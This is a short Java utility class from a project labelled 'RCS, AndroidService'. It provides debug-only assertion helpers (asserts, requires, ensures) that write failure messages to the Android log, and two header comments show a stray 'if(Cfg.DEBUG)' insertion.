/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : if(Cfg.DEBUG) Check.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.util;

import android.util.Log;

import com.android.service.auto.Cfg;

/**
 * The Class if(Cfg.DEBUG) Check.
 */
public final class Check {

	private static final String TAG = "Check";
	private static boolean enabled = Cfg.DEBUG;

	/**
	 * Asserts, used to verify the truth of an expression
	 * 
	 * @param b
	 *            the b
	 * @param string
	 *            the string
	 */
	public static void asserts(final boolean b, final String string) {
		if (enabled && b != true) {
			if(Cfg.DEBUG) Log.d("QZ", TAG + "##### Asserts - " + string + " #####");
		}
	}

	/**
	 * Requires. Used to check prerequisites of a method.
	 * 
	 * @param b
	 *            the b
	 * @param string
	 *            the string
	 */
	public static void requires(final boolean b, final String string) {
		if (enabled && b != true) {
			if(Cfg.DEBUG) Log.d("QZ", TAG + "##### Requires - " + string + " #####");
		}
	}

	/**
	 * Ensures. Checks to be done at the end of a method.
	 * 
	 * @param b
	 *            the b
	 * @param string
	 *            the string
	 */
	public static void ensures(final boolean b, final String string) {
		if (enabled && b != true) {
			if(Cfg.DEBUG) Log.d("QZ", TAG + "##### Ensures - " + string + " #####");
		}
	}
}
